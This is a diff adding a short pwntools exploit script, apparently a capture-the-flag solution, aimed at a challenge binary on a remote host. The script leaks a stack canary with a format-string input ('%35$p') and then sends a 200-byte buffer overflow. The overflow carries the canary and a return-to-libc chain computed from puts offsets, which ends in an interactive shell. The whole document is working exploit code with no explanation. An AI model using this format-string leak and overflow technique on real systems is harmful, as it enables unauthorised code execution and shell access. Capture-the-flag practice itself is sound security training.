@@ -1,0 +1,23 @@
+from pwn import *
+p=process('./chal')
+p=remote('23.146.248.136', 21101)
+p.sendline(b'9')
+sleep(1)
+print(p.recv().decode())
+
+p.sendline(b'8')
+p.sendline(b'y')
+p.sendline(b'%35$p')
+sleep(1)
+print(p.recv().decode())
+
+p.sendline(b'1')
+p.sendline(b'1')
+p.sendline(b'1')
+p.sendline(b'1')
+p.sendline(b'1')
+canary=int(input('canary: '),16)
+puts=int(input('puts: '),16)
+payload=b'a'*200+p64(canary)+p64(0)+p64(puts-353371+1)+p64(puts-353371)+p64(puts+1210628)+p64(puts-185488)
+p.send(payload)
+p.interactive()
